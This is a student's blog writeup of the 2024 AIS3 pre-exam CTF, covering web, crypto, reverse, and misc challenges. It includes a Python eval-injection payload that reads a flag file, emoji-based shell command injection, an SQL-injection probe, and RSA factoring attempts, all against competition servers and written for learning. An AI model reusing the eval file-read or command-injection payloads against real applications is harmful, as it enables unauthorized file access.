---
abbrlink: d01f5ccf
categories:
- CTF
cover: https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/24/8/Blog_cover%20(16)%20(1)_2fdc2382942f5aef8475bf32d3e8ab3d.jpg
date: '2024-06-02T21:42:41+08:00'
tags:
- 資安
- AIS3
title: 2024 AIS3 Pre-exam Writeup
updated: '2024-10-01T02:17:17.718+08:00'
---
# Intro

請容我先自我介紹一下！我今年大一，在高中的時候並不是理工背景的學生，相反，我原本是打算去唸法律系的。但是在高三下的時候意外接觸到了 CTF 的資訊，自己稍微摸索了一下，也學了一點程式設計後發現自己對這個領域更為有興趣。可惜當時已經來不及報名學測的自然科目，我就下定決心要到成大不分系，利用他們的選課權利多修習資工系的課程。最終，我如願進到了成大，也在這將近一年的時間裡，修著和資工系一樣的課程，也更加地堅定了自己的選擇是正確的。

而進到成大後我也並沒有忘記自己當時的初衷，是因為對資安特別感興趣，才誘使我轉換到了這條跑道，所以我也報名了 SCIST 的課程，希望可以在資安領域有更多的成長。嚴格說起來，加上 SCIST 的期末考試，這次是我第二次正式的資安比賽。而這次的我又比上次(SCIST 期末考)花了更多的時間在解題。這次三天的賽程，我幾乎是除了吃飯睡覺以外的時間，都在解題(三點睡覺八點起床 💤)，可惜最後還是一直卡在一些想不出來的點，所以解出來的題目還是有點少。希望在我今年暑假的修煉過後，下次參賽可以有更好的表現！

# Web

## Evil Calculator

> _Command Injection_

先觀察題目，打開 F12 的開發者工具，隨便輸入點東西看看它的運作。這邊我們先在計算機上按下 3+3。

![](https://hackmd.io/_uploads/SydoCk94C.png)

在圖中我們可以看見，他其實是傳了一個 request 給後端服務器，後端服務器會去執行這個計算，並且把結果回傳給前端。這邊的 payload 長這樣:

```json=
{"expression": "3+3"}
```

我們可以發現他就是執行了後面的 3+3。這時候我們再去看題目給的`app.py`文件，就可以更加地確定我們的想法是對的。如下:

```python=
@app.route("/calculate", methods=["POST"])
def calculate():
    data = request.json
    expression = data["expression"].replace(" ", "").replace("_", "")
    try:
        result = eval(expression) # 這裡就是我們要inject的地方！
    except Exception as e:
        result = str(e)
    return jsonify(result=str(result))
```

所以我們只要把`{expression: "3+3"}`中的`"3+3"`替換成我們要注入的命令就可以被執行了。

我這邊是用 Chrome 的插件 HackBar 去送請求，本來想要直接`cat ../flag`，但我發現他的源碼中會把空格給取代掉，像這樣

```python=
expression = data["expression"].replace(" ", "").replace("_", "")
```

所以換了種寫法，payload 如下:

```json=
{"expression": "''.join([open('../flag').read()])"}
```

然後我們就得到 flag 了！

![evil calculator flag](https://hackmd.io/_uploads/S1DlyecE0.png)

(圖片的字可能有點小，flag 我放在下面)

```txt
 AIS3{7RiANG13_5NAK3_I5_50_3Vi1}
```

(我在寫 writeup 的時候才想到，原來題目叫做 evil calculator 是因為作者給了個小提示告訴我們源碼中的 eval 函式有問題 😶)

## Ebook Parser

這題我一看到就覺得是文件上傳漏洞(file upload vulnerability)。

![](https://hackmd.io/_uploads/HyNVgLoN0.png)

但是知道是知道，難就難在我不知道 payload 是甚麼以及該怎麼實作 🥲。所以我嘗試了很多種方法，包括在某個 epub 檔案後面注入一些東西，但都還是失敗了。

## It's MyGO!!!!!

這個題目給了個網站，上面有很多甚麼 MyGO 的東西(我不知道這啥但我室友一直很開心??)，然後稍微亂點一下之後會發現沒有甚麼東西，就是三個介面:簡介、成員介紹、原創曲。點到原創曲那邊後會發現網址好像有個 SQLi 的機會，如下:

```txt
http://chals1.ais3.org:11454/song?id=2
```

嘗試過後發現如果把網址改為

```txt
http://chals1.ais3.org:11454/song?id=5-3
```

一樣可以跳出剛剛 song id=2 的畫面，所以推測應該是數字型 SQLi。至此，我就沒有想法了...。雖然好像應該要寫出來的，但可惜之前一直沒有好好研究 SQL 語法，所以也不太知道漏洞該用怎麼樣的 payload。(然後後來聽大家在群組說好像可以用 SQLmap，好可惜...暑假一定來好好研究 SQLmap 的文檔～)

# Crypto

密碼學真的是一直以來都覺得很難的東西，全部都是數學要理解起來還真的是有點小吃力，希望之後可以多多加油 😶‍🌫️

## babyRSA

這題叫做 babyRSA，但我到最後都還是沒能寫出來 🥲🥲🥲。好的先來看看題目，題目如下:

```python=
import random
from Crypto.Util.number import getPrime

from secret import flag


def gcd(a, b):
    while b:
        a, b = b, a % b
    return a


def generate_keypair(keysize):
    p = getPrime(keysize)
    q = getPrime(keysize)
    n = p * q
    phi = (p - 1) * (q - 1)

    e = random.randrange(1, phi)
    g = gcd(e, phi)
    while g != 1:
        e = random.randrange(1, phi)
        g = gcd(e, phi)
    d = pow(e, -1, phi)
    return ((e, n), (d, n))


def encrypt(pk, plaintext):
    key, n = pk  # pk =(e, n)
    cipher = [pow(ord(char), key, n) for char in plaintext]
    return cipher


def decrypt(pk, ciphertext):
    key, n = pk  # pk = (d, n)
    plain = [chr(pow(char, key, n)) for char in ciphertext]
    return "".join(plain)


public, private = generate_keypair(512)
encrypted_msg = encrypt(public, flag)
decrypted_msg = decrypt(private, encrypted_msg)

print("Public Key:", public)
print("Encrypted:", encrypted_msg)
print("Decrypted:", decrypted_msg)
```

題目看起來就是個正常的 RSA 加密流程:

1. 先取得兩個大質數$p$和$q$
2. $p$和$q$相乘後得到$n$
3. $(p-1)\times(q-1)$得到$\phi(n)$
4. 再找一個和$\phi(n)$互質的$e$，至此，公鑰已經完成
5. 再用$e^{-1} \bmod \phi(n)$算出 d，至此，私鑰也已經找到

然後接下來我來整理一下我這次嘗試過的各種解法。

### 暴力因式分解

我嘗試使用[FactorDB](http://factordb.com/)去分解$n$，找到需要的$p$跟$q$，但可惜最後以失敗告終。

### 費馬分解(Fermat's factorization)

費馬分解是用在當$p$跟$q$相差很小的時候使用的，但因為不知道$p$和$q$所以就還是試試看囉。至於我的腳本就長得像下面這樣:

```python=
def fermat_factorization(n: int) -> tuple[int, int]:
    a = gmpy2.isqrt(n) + 1
    b = a**2 - n
    round = 0
    while not gmpy2.iroot(b, 2)[1]:
        round += 1
        print(f"Round {round}: a = {a}, b = {b}", end="\r")
        a += 1
        b = a**2 - n
    b = gmpy2.iroot(b, 2)[0]
    return (a + b, a - b)
```

可是我開始運行之後很久都還是沒分解出$p$跟$q$，可能是因為$p$和$|p-q|$其實不小吧。

### Wiener's attack

這邊我是使用了[這個工具](https://github.com/pablocelayes/rsa-wiener-attack)來嘗試破解，不過也是失敗，估計是$e$還不夠大，所以$d$還不夠小吧。雖然這題最後沒解出來讓我傷心了很久(因為我賽前還特別去練習了 RSA 的題目結果居然解不出 baby!!!)，但希望這傷心可以轉化為動力，讓我繼續學習！對自己的小期許就是下次甚麼 RSA 一定要寫出來啦啦啦！😠

# Reverse

## The Long Print

題目給了我們一個二進制文件，然後又是出題在 Reverse 類別，所以就理所當然地把檔案用[IDA](https://hex-rays.com/ida-free/)打開來看看吧！

![IDA打開的樣子](https://hackmd.io/_uploads/HJprW1oNR.png)

點開之後我們就會看到一堆很可怕的東西，所以趕快按下我們的 tab/F5 讓 IDA 幫我們 Decompile 一下。

![IDA Decompile](https://hackmd.io/_uploads/SkydbyjVR.png)

這樣看起來平易近人多了。那我們就一步一步跟隨著這個程式研究一下他到底如何運作的。為了寫的詳細點我把代碼放上來加點註解解釋一下(寫一起感覺比較清楚)，如下:

```c=
int __fastcall main(int argc, const char **argv, const char **envp)
{
  unsigned int v4; // [rsp+4h] [rbp-Ch]
  int i; // [rsp+8h] [rbp-8h]
  int j; // [rsp+Ch] [rbp-4h]

  puts("Hope you have enough time to receive my flag:");
  for ( i = 0; i <= 23; i += 2 ) // 從i = 0到i > 23，步長為2，共12循環
  {
    // *(_DWORD *)&secret[4 * i]: 從secret的第4 * i個字節開始提取4個字節的整數
    // *(unsigned int *)&secret[4 * i + 4]: 從secret的第4 * i + 4個字節開始提取4個字節的整數
    // 再用上面的那個東西作為索引，從key中提取出相對應的值
    // 把兩個整數做XOR並賦值給v4
    v4 = *(_DWORD *)&secret[4 * i] ^ key[*(unsigned int *)&secret[4 * i + 4]];
    for ( j = 0; j <= 3; ++j )
    {
      sleep(0x3674u); // 休眠一段時間
      printf("%c", v4); // 輸出v4的最低位字節作為字符
      v4 >>= 8; // v4向右移8個bits == 一個byte == 一個字節，把剛剛輸出過的字節丟棄
      fflush(_bss_start); // 刷新輸出緩衝區
    }
  }
  puts("\rOops! Where is the flag? I am sure that the flag is already printed!");
  return 0;
}
```

理解了這段程式碼後，第一件事當然是去看看這個 secret 跟 key 到底是甚麼東西囉。在 secret 上點兩下，然後點選 hex view 之後，發現了神奇的東西。

```txt
46 41 4B 45 0B 00 00 00  7B 68 6F 6F 0A 00 00 00  FAKE....{hoo....
72 61 79 5F 02 00 00 00  73 74 72 69 08 00 00 00  ray_....stri....
6E 67 73 5F 06 00 00 00  69 73 5F 61 05 00 00 00  ngs_....is_a....
6C 77 61 79 07 00 00 00  73 5F 61 6E 04 00 00 00  lway....s_an....
5F 75 73 65 09 00 00 00  66 75 6C 5F 00 00 00 00  _use....ful_....
63 6F 6D 6D 01 00 00 00  61 6E 7A 7D 03 00 00 00  comm....anz}....
```

我當時瞬間以為這就是 flag，提交了之後，想當然，沒那麼簡單 U0001f979。所以繼續往下看看。這樣看起來剛剛那串東西就是我們需要的 secret 了。再來我們在 key 上面點兩下，就可以發現 key 的值是下面這樣:

```
.rodata:0000000000002080 key             dd 3A011001h, 4C4C1B0Dh, 3A0B002Dh, 454F40h, 3104321Ah
.rodata:0000000000002080                                         ; DATA XREF: main+6A↑o
.rodata:0000000000002094                 dd 3E2D161Dh, 2C120A31h, 0D3E1103h, 0C1A002Ch, 41D1432h
.rodata:00000000000020A8                 dd 1A003100h, 76180807h
```

接下來，我們就只要照題目所做的把它 print 出來就行了(除了 sleep 跟 fflush 的部分)，exploit 腳本如下:

```python=
secret = [
    ord("F"),
    ord("A"),
    ord("K"),
    ord("E"),
    0x0B,
    0x00,
    0x00,
    0x00,
    ord("{"),
    ord("h"),
    ord("o"),
    ord("o"),
    0x0A,
    0x00,
    0x00,
    0x00,
    0x72,
    0x61,
    0x79,
    0x5F,
    0x02,
    0x00,
    0x00,
    0x00,
    0x73,
    0x74,
    0x72,
    0x69,
    0x08,
    0x00,
    0x00,
    0x00,
    0x6E,
    0x67,
    0x73,
    0x5F,
    0x06,
    0x00,
    0x00,
    0x00,
    0x69,
    0x73,
    0x5F,
    0x61,
    0x05,
    0x00,
    0x00,
    0x00,
    0x6C,
    0x77,
    0x61,
    0x79,
    0x07,
    0x00,
    0x00,
    0x00,
    0x73,
    0x5F,
    0x61,
    0x6E,
    0x04,
    0x00,
    0x00,
    0x00,
    0x5F,
    0x75,
    0x73,
    0x65,
    0x09,
    0x00,
    0x00,
    0x00,
    0x66,
    0x75,
    0x6C,
    0x5F,
    0x00,
    0x00,
    0x00,
    0x00,
    0x63,
    0x6F,
    0x6D,
    0x6D,
    0x01,
    0x00,
    0x00,
    0x00,
    0x61,
    0x6E,
    0x7A,
    0x7D,
    0x03,
    0x00,
    0x00,
    0x00,
]

key = [
    0x3A011001,
    0x4C4C1B0D,
    0x3A0B002D,
    0x00454F40,
    0x3104321A,
    0x3E2D161D,
    0x2C120A31,
    0x0D3E1103,
    0x0C1A002C,
    0x041D1432,
    0x1A003100,
    0x76180807,
]


def decode():
    result = ""
    for i in range(0, 24, 2):
        part1 = int.from_bytes(secret[4 * i : 4 * i + 4], byteorder="little")  # 小端序
        index = int.from_bytes(
            secret[4 * i + 4 : 4 * i + 8], byteorder="little"
        )  # 小端序
        v4 = part1 ^ key[index]
        for j in range(4):
            c = (v4 >> (8 * j)) & 0xFF
            result += chr(c)
    return result


print(decode())
```

執行之後 flag 就被 print 出來啦！

```txt
AIS3{You_are_the_master_of_time_management!!!!?}
```

# Pwn

因為 Pwn 的部分比較都只是看看題目然後沒有頭緒，或是有頭緒但是不知道該如何做起，再加上到了很晚才去碰 Pwn 的題目，所以就都比較沒有進展，就不寫出來了。

# Misc

## Three Dimensional Secret

> _封包分析_

這題給了一個`capture.pcapng`，所以我們先用 Wireshark 把檔案給打開來，看看他葫蘆裡賣的是甚麼藥。![image](https://hackmd.io/_uploads/r1EEdx9VR.png)
在圖片中我們可以看到超級多的 TCP 封包，我一開始還不太知道接下來該怎麼做，但我在翻了一下[這本書](https://www.books.com.tw/products/0010884220)之後就找到解法了！

首先我們先對著這坨 TCP 封包點右鍵，會出現一個選項叫做 Follow，如圖:

![Wireshark](https://hackmd.io/_uploads/SJkMtl5NA.png)

然後我們把它點下去，然後再選擇 TCP Stream，就可以看到 Wireshark 所解析出來的內容，如下:

![](https://hackmd.io/_uploads/SkGcFx5N0.png)

因為之前忘記在哪裡刷提的時候有寫過類似的題目，所以我知道這串看不懂的字其實是一個叫做 Gcode 的東西，它是用來控制工業中的一些自動工具機的代碼。因為太長了，所以我只放一小部分在下面。Gcode 就長下面這樣。

```gcode
G0 X171.826 Y145.358
G0 X171.773 Y144.928
G0 X171.082 Y142.074
G0 X171.877 Y141.336
G0 X172.029 Y138.178
G0 X172.802 Y136.983
;TYPE:WALL-INNER
G1 F1500 E2061.27916
G1 F21000 X173.166 Y136.922 E2061.89293
G1 X173.47 Y136.79 E2062.44409
G1 X173.747 Y136.571 E2063.03132
G1 X173.95 Y136.281 E2063.62001
G1 X174.046 Y135.929 E2064.22677
G1 X174.043 Y135.473 E2064.98511
```

既然已經知道了他是 Gcode，我們就趕快來找一個線上的 Viewer 來看看他生作圓還是扁吧！我使用的網站是[這個](https://ncviewer.com/)。把那串代碼放上去後，就點一下圖中的 Plot 來看看！

![](https://hackmd.io/_uploads/HJA09l9N0.png)

點下去後發現居然沒有東西，我直接愣在原地被硬控三秒鐘。難道是我想錯了嗎！！！在慌亂之中，我趕緊調整視角，終於發現了偷偷躲在旁邊的 Flag，如下:

![](https://hackmd.io/_uploads/SyqholcNR.png)

(然後因為我偷懶+怕打錯字所以用了 OCR 把它的文字題取出來)

```txt
AIS3{b4d1y_tun3d PriN73r}
```

## Emoji Console

這題點進去後發現是長下面這樣，是由很多 Emoji 所組成的一個 Console，也難怪題目就叫這名字 XD。

![](https://hackmd.io/_uploads/Hyj42rsEC.png)

在這邊，我嘗試點了一些不同的 emoji，發現會對應到右邊不同的字符，組成不同的命令，所以我先用了

```txt
🐱 ⭐
```

把當前目錄下的所有東西都 cat 出來看看，果然看到了題目的腳本內容。如下:

```python=
#!/usr/local/bin/python3

import os
from flask import Flask, send_file, request, redirect, jsonify, render_template
import json
import string


def translate(command: str) -> str:
    emoji_table = json.load(open("emoji.json", "r", encoding="utf-8"))
    for key in emoji_table:
        if key in command:
            command = command.replace(key, emoji_table[key])
    return command.lower()


app = Flask(__name__)


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/api")
def api():
    command = request.args.get("command")

    if len(set(command).intersection(set(string.printable.replace(" ", "")))) > 0:
        return jsonify({"command": command, "result": "Invalid command"})
    command = translate(command)
    result = os.popen(command + " 2>&1").read()
    return jsonify({"command": command, "result": result})


if __name__ == "__main__":
    app.run("0.0.0.0", 5000)

{
    "😀": ":D",
    "😁": ":D",
    "😂": ":')",
    "🤣": "XD",
    "😃": ":D",
    "😄": ":D",
    "😅": "':D",
    "😆": "XD",
    "😉": ";)",
    "😊": ":)",
    "😋": ":P",
    "😎": "B)",
    "😍": ":)",
    "😘": ":*",
    "😗": ":*",
    "😙": ":*",
    "😚": ":*",
    "☺️": ":)",
    "🙂": ":)",
    "🤗": ":)",
    "🤩": ":)",
    "🤔": ":?",
    "🤨": ":/",
    "😐": ":|",
    "😑": ":|",
    "😶": ":|",
    "🙄": ":/",
    "😏": ":]",
    "😣": ">:",
    "😥": ":'(",
    "😮": ":o",
    "🤐": ":x",
    "😯": ":o",
    "😪": ":'(",
    "😫": ">:(",
    "😴": "Zzz",
    "😌": ":)",
    "😛": ":P",
    "😜": ";P",
    "😝": "XP",
    "🤤": ":P",
    "😒": ":/",
    "😓": ";/",
    "😔": ":(",
    "😕": ":/",
    "🙃": "(:",
    "🤑": "$)",
    "😲": ":O",
    "☹️": ":(",
    "🙁": ":(",
    "😖": ">:(",
    "😞": ":(",
    "😟": ":(",
    "😤": ">:(",
    "😢": ":'(",
    "😭": ":'(",
    "😦": ":(",
    "😧": ">:(",
    "😨": ":O",
    "😩": ">:(",
    "🤯": ":O",
    "😬": ":E",
    "😰": ":(",
    "😱": ":O",
    "🥵": ">:(",
    "🥶": ":(",
    "😳": ":$",
    "🤪": ":P",
    "😵": "X(",
    "🥴": ":P",
    "😠": ">:(",
    "😡": ">:(，",
    "🤬": "#$%&!",
    "🤕": ":(",
    "🤢": "X(",
    "🤮": ":P",
    "🤧": ":'(",
    "😇": "O:)",
    "🥳": ":D",
    "🥺": ":'(",
    "🤡": ":o)",
    "🤠": "Y)",
    "🤥": ":L",
    "🤫": ":x",
    "🤭": ":x",
    "🐶": "dog",
    "🐱": "cat",
    "🐭": "mouse",
    "🐹": "hamster",
    "🐰": "rabbit",
    "🦊": "fox",
    "🐻": "bear",
    "🐼": "panda",
    "🐨": "koala",
    "🐯": "tiger",
    "🦁": "lion",
    "🐮": "cow",
    "🐷": "pig",
    "🐽": "pig nose",
    "🐸": "frog",
    "🐒": "monkey",
    "🐔": "chicken",
    "🐧": "penguin",
    "🐦": "bird",
    "🐤": "baby chick",
    "🐣": "hatching chick",
    "🐥": "front-facing baby chick",
    "🦆": "duck",
    "🦅": "eagle",
    "🦉": "owl",
    "🦇": "bat",
    "🐺": "wolf",
    "🐗": "boar",
    "🐴": "horse",
    "🦄": "unicorn",
    "🐝": "bee",
    "🐛": "bug",
    "🦋": "butterfly",
    "🐌": "snail",
    "🐞": "lady beetle",
    "🐜": "ant",
    "🦟": "mosquito",
    "🦗": "cricket",
    "🕷️": "spider",
    "🕸️": "spider web",
    "🦂": "scorpion",
    "🐢": "turtle",
    "🐍": "python",
    "🦎": "lizard",
    "🦖": "T-Rex",
    "🦕": "sauropod",
    "🐙": "octopus",
    "🦑": "squid",
    "🦐": "shrimp",
    "🦞": "lobster",
    "🦀": "crab",
    "🐡": "blowfish",
    "🐠": "tropical fish",
    "🐟": "fish",
    "🐬": "dolphin",
    "🐳": "whale",
    "🐋": "whale",
    "🦈": "shark",
    "🐊": "crocodile",
    "🐅": "tiger",
    "🐆": "leopard",
    "🦓": "zebra",
    "🦍": "gorilla",
    "🦧": "orangutan",
    "🦣": "mammoth",
    "🐘": "elephant",
    "🦛": "hippopotamus",
    "🦏": "rhinoceros",
    "🐪": "camel",
    "🐫": "two-hump camel",
    "🦒": "giraffe",
    "🦘": "kangaroo",
    "🦬": "bison",
    "🦥": "sloth",
    "🦦": "otter",
    "🦨": "skunk",
    "🦡": "badger",
    "🐾": "paw prints",
    "◼️": "black square",
    "◻️": "white square",
    "◾": "black medium square",
    "◽": "white medium square",
    "▪️": "black small square",
    "▫️": "white small square",
    "🔶": "large orange diamond",
    "🔷": "large blue diamond",
    "🔸": "small orange diamond",
    "🔹": "small blue diamond",
    "🔺": "triangle",
    "🔻": "triangle",
    "🔼": "triangle",
    "🔽": "triangle",
    "🔘": "circle",
    "⚪": "circle",
    "⚫": "black circle",
    "🟠": "orange circle",
    "🟢": "green circle",
    "🔵": "blue circle",
    "🟣": "purple circle",
    "🟡": "yellow circle",
    "🟤": "brown circle",
    "⭕": "empty circle",
    "🅰️": "A",
    "🅱️": "B",
    "🅾️": "O",
    "ℹ️": "i",
    "🅿️": "P",
    "Ⓜ️": "M",
    "🆎": "AB",
    "🆑": "CL",
    "🆒": "COOL",
    "🆓": "FREE",
    "🆔": "ID",
    "🆕": "NEW",
    "🆖": "NG",
    "🆗": "OK",
    "🆘": "SOS",
    "🆙": "UP",
    "🆚": "VS",
    "㊗️": "祝",
    "㊙️": "秘",
    "🈺": "營",
    "🈯": "指",
    "🉐": "得",
    "🈹": "割",
    "🈚": "無",
    "🈲": "禁",
    "🈸": "申",
    "🈴": "合",
    "🈳": "空",
    "🈵": "滿",
    "🈶": "有",
    "🈷️": "月",
    "🚗": "car",
    "🚕": "taxi",
    "🚙": "SUV",
    "🚌": "bus",
    "🚎": "trolleybus",
    "🏎️": "race car",
    "🚓": "police car",
    "🚑": "ambulance",
    "🚒": "fire engine",
    "🚐": "minibus",
    "🚚": "delivery truck",
    "🚛": "articulated lorry",
    "🚜": "tractor",
    "🛴": "kick scooter",
    "🚲": "bicycle",
    "🛵": "scooter",
    "🏍️": "motorcycle",
    "✈️": "airplane",
    "🚀": "rocket",
    "🛸": "UFO",
    "🚁": "helicopter",
    "🛶": "canoe",
    "⛵": "sailboat",
    "🚤": "speedboat",
    "🛳️": "passenger ship",
    "⛴️": "ferry",
    "🛥️": "motor boat",
    "🚢": "ship",
    "👨": "man",
    "👩": "woman",
    "👶": "baby",
    "🧓": "old man",
    "👵": "old woman",
    "💿": "CD",
    "📀": "DVD",
    "📱": "phone",
    "💻": "laptop",
    "🖥️": "pc",
    "🖨️": "printer",
    "⌨️": "keyboard",
    "🖱️": "mouse",
    "🖲️": "trackball",
    "🕹️": "joystick",
    "🗜️": "clamp",
    "💾": "floppy disk",
    "💽": "minidisc",
    "☎️": "telephone",
    "📟": "pager",
    "📺": "television",
    "📻": "radio",
    "🎙️": "studio microphone",
    "🎚️": "level slider",
    "🎛️": "control knobs",
    "⏰": "alarm clock",
    "🕰️": "mantelpiece clock",
    "⌚": "watch",
    "📡": "satellite antenna",
    "🔋": "battery",
    "🔌": "plug",
    "🚩": "flag",
    "⓿": "0",
    "❶": "1",
    "❷": "2",
    "❸": "3",
    "❹": "4",
    "❺": "5",
    "❻": "6",
    "❼": "7",
    "❽": "8",
    "❾": "9",
    "❿": "10",
    "⭐": "*",
    "➕": "+",
    "➖": "-",
    "✖️": "×",
    "➗": "÷",
}
```

至此，我們已經知道了每個符號所對應到的字符，我馬上嘗試使用

```txt
🐱 🚩 (cat flag)
```

但可惜題目回應`cat: flag: Is a directory`，代表這層目錄的 flag 是一個目錄而不是個文件，沒辦法 cat。我推測真正的 flag 是在`flag/flag`的位置，於是我又嘗試了

```txt
🐱 🚩/🚩 (cat flag/flag)
```

但是題目會擋掉所有非 emoji 所輸入的東西，所以只能透過組合 emoji 去 bypass 這個條件，可是我嘗試了兩天還是不知道要怎麼繞過才能 cat 到 flag 底下的 flag。

## Quantum Nim Heist

這題是個尼姆遊戲，我上網查了一下之後發現他是有必勝方法的(有點類似小時候玩那種誰先喊到 21 就贏了的遊戲)。所以我就寫了下面的 exploit script:

```python=
from pwn import *
from typing import Tuple
import random
import time


def get_move(piles) -> Tuple[int, int]:
    nim_sum = 0
    for pile in piles:
        nim_sum ^= int(pile)

    if nim_sum == 0:
        # losing game, make a random move
        pile = random.randint(0, len(piles) - 1)
        count = random.randint(1, int(piles[pile]))
    else:
        # winning game, make a winning move
        for i, v in enumerate(piles):
            v = int(v)
            target = v ^ nim_sum
            if target < v:
                pile = i
                count = v - target
                break

    return (pile, count)


r = remote("chals1.ais3.org", 40004)

try:
    r.recvuntil(b"what would you like to do?")
    r.sendline(b"1")  # start
    now = 0

    while True:
        # time.sleep(1)
        print(f"Loop {now}")
        text = r.recvuntil(b"it's your turn to move! what do you choose?")
        print(text.decode())
        r.sendline(b"1")  # stop and save
        r.recvuntil(b"here is your saved game:\n")
        line = r.recvline().decode().strip()
        info = line.split(":")
        piles = info[0].split(",")
        print(piles)
        hash = info[1]
        which_pile, how_many = get_move(piles)
        r.sendline(b"2")
        r.recvuntil(b"enter the saved game:")
        r.sendline(line.encode())
        r.recvuntil(b"it's your turn to move! what do you choose?")
        r.sendline(b"0")  # choose to move
        which_pile = str(which_pile).encode()
        how_many = str(how_many).encode()
        print(which_pile, how_many)
        print(type(which_pile), type(how_many))
        r.sendline(which_pile)
        r.sendline(how_many)
        now += 1

except Exception as e:
    print(f"Error: {e}")
finally:
    r.close()
```

運行了幾次後發現，怎麼每次都是輸阿?難道我寫錯了嗎?

經過幾次對 ChatGPT 的詠唱發現自己並沒有寫錯，問題是出在我沒有看到題目有給原始碼...。看了一下後發現原來題目在一開始生成遊戲的時候就已經註定了先手(我們)會輸的結局。如下:

```python=
def menu():
    print_main_menu()
    choice = input("what would you like to do? ").strip()

    if choice == "0":
        print_rules()

    elif choice == "1":
        game = Game()
        game.generate_losing_game() # 這邊，他生成了我們會輸的遊戲局面
        play(game)

    elif choice == "2":
        saved = input("enter the saved game: ").strip()
        game_str, digest = saved.split(":")
        if hash.hexdigest(game_str.encode()) == digest:
            game = Game()
            game.load(game_str)
            play(game)
        else:
            print_error("invalid game provided!")

    elif choice == "3":
        print("omg bye!")
        exit(0)
```

至此，我的思路就有點卡住了。本來還以為題目設計可以讓我們中途暫停退出，然後用輸入 hash 值得方式繼續剛才的遊戲是為了讓我們可以判斷一下現在的局面，暫停退出先計算出下一步然後再回來繼續遊戲。結果當 Hint 出來的時候說明不要照著規則玩，我整個就失去方向了，所以最後還是不知道怎麼解的。(到現在在寫 writeup 都還是真的好好奇)

# Forensics

這次好像把 Forensic 的題目都放在 Misc 裡面了所以跳過這 Part

# My Thoughts

在這次參賽完之後，我明顯的體認到了自己的不足之處。就是那種，已經很努力了而且賽期也花了絕大部分的時間在比賽上面，成績卻還是不理想。也更加清楚的知道自己還需要修煉，還有很長一段路得走。

每次參加資安的活動、課程等等，看到那些厲害的學長姐們聚在一起聊天的時候常常會幻想自己有天也能躋身在他們的行列，也是因此，我打算在暑假的時候好好修煉！期待下學期的自己可以多多參加 CTF 比賽，並且爭取得到些成績。在這次暑假中我也會把我每次練習題目的 Writeup 放在我的個人網站上，如果有任何理解錯誤的地方也歡迎大家指正！

> Do not go gentle into that good night; Old age should burn and rave at close of day. Rage, rage against the dying of the light." -- **_Interstellar_**

# Reference

有鑑於我認為自己在資訊這個領域中，如果能有任何的成就或是進展，很大部分的原因都是站在了許多巨人的肩膀上，所以我會把比賽過程中用到的資源都放上來。

不僅僅是為了致敬及感謝，更要提醒自己，自己的不足及渺小。

- [駭客廝殺不講武德：CTF 強者攻防大戰直擊](https://www.books.com.tw/products/0010884220)
- [2020/10/24 Web Security 基礎 題解](https://scist.org/blog/2020/10/27/2020%20SCIST%20Web/)
- [CTF Crypto RSA 算法 入门总结（全）](https://blog.csdn.net/vanarrow/article/details/107846987)
- [CTF-RSA 加密-1](https://blog.csdn.net/orchid_sea/article/details/134164177)
- [CTF-Crypto-RSA 基本原理及常见攻击方法](https://blog.csdn.net/ISHobbyst/article/details/108918079)
- [CTF 学习笔记——RSA 加密](https://blog.csdn.net/qq_45198339/article/details/128741483)
- [『 Day 29』拜託別 Pwn 我啦！ - Buffer Overflow](https://ithelp.ithome.com.tw/articles/10227814)
- [PWN 入門 - buffer overflow 是什麼？](https://tech-blog.cymetrics.io/posts/crystal/pwn-intro/)
- [[資訊安全] 從毫無基礎開始 Pwn – Buffer Overflow 實作](https://mks.tw/2976/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8-%E5%BE%9E%E6%AF%AB%E7%84%A1%E5%9F%BA%E7%A4%8E%E9%96%8B%E5%A7%8B-pwn-buffer-overflow)
- [rsa-wiener-attack](https://github.com/pablocelayes/rsa-wiener-attack)
- [Linux 的 cut 擷取部份字元、欄位指令教學與常用範例整理](https://blog.gtwang.org/linux/linux-cut-command-tutorial-and-examples/)
- [Bash Script 語法解析](https://medium.com/vswe/bash-shell-script-cheat-sheet-15ce3cb1b2c7)
- [linux 特殊符号大全](https://www.cnblogs.com/balaamwe/archive/2012/03/15/2397998.html)
- [Linux 中特殊符号的作用](https://blog.csdn.net/u012060033/article/details/104310372)
- [[新手入門] 003 Linux 指令教學](https://feifei.tw/learn-linux/)
- [【CTF 攻略】FlappyPig HCTF2016 Writeup](https://www.anquanke.com/post/id/85007)
- [BUUCTF：[CFI-CTF 2018]webLogon capture](https://blog.csdn.net/mochu7777777/article/details/110004233)

雖然已經盡力回想及搜尋過程中有用到的資源，但可能還是會有些漏網之魚，還請見諒。
